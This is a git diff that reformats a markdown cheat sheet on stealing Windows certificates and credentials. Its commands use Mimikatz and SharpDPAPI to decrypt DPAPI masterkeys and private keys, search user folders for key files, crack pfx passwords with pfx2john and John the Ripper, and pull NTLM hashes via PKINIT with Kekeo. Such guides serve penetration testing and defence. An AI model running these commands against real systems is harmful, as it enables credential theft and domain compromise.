@@ -26,15 +26,15 @@
 
 ### For acquiring the plaintext DPAPI masterkey, the following approaches can be used:
 
- - dpapi::masterkey /in:"C:\PATH\TO\KEY" /rpc (With Mimikatz, when running in the user's context)
+    dpapi::masterkey /in:"C:\PATH\TO\KEY" /rpc (With Mimikatz, when running in the user's context)
 
- - dpapi::masterkey /in:"C:\PATH\TO\KEY" /sid:accountSid /password:PASS (With Mimikatz, if the user's password is known)
+    dpapi::masterkey /in:"C:\PATH\TO\KEY" /sid:accountSid /password:PASS (With Mimikatz, if the user's password is known)
 
 ### To streamline the decryption of masterkey files and private key files, the certificates command from SharpDPAPI proves beneficial. It accepts /pvk, /mkfile, /password, or {GUID}:KEY as arguments to decrypt the private keys and linked certificates, subsequently generating a .pem file.
 
- - SharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt (Decrypting using SharpDPAPI
+    SharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt (Decrypting using SharpDPAPI)
 
- - openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx (Converting .pem to .pfx)
+    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx (Converting .pem to .pfx)
 
 # THEFT3 - Machine Certificate Theft via DPAPI
 
@@ -62,11 +62,17 @@
 
 ## Commands: 
 
- - Get-ChildItem -Recurse -Path C:\Users\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.crt, *.cer, *.csr, *.jks, *.keystore, *.keys (Search for certificate files in Powershell)
+#### 1) Search for certificate files in Powershell
 
- - pfx2john.py certificate.pfx > hash.txt (Extract a hash from a PKCS#12 file)
+    Get-ChildItem -Recurse -Path C:\Users\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.crt, *.cer, *.csr, *.jks, *.keystore, *.keys 
 
- - john --wordlist=passwords.txt hash.txt (Crack the hash with John The Ripper)
+#### 2) Extract a hash from a PKCS#12 file
+
+    pfx2john.py certificate.pfx > hash.txt 
+
+#### 3) Crack the hash with John The Ripper
+
+    john --wordlist=passwords.txt hash.txt 
 
 # THEFT5 - NTLM Credential Theft via PKINIT 
 
@@ -76,7 +82,7 @@
 
 ### The utility Kekeo, accessible at https://github.com/gentilkiwi/kekeo, is mentioned as capable of requesting a TGT containing this specific data, thereby facilitating the retrieval of the user's NTLM. The command utilized for this purpose is as follows:
 
- - Kekeo.exe tgt::pac /caname:generic-DC-CA /subject:genericUser /castore:current_user /domain:domain.local
+    Kekeo.exe tgt::pac /caname:generic-DC-CA /subject:genericUser /castore:current_user /domain:domain.local
 
 ### Additionally, it is noted that Kekeo can process smartcard-protected certificates, given the pin can be retrieved, with reference made to https://github.com/CCob/PinSwipe. The same capability is indicated to be supported by Rubeus, available at https://github.com/GhostPack/Rubeus.
 
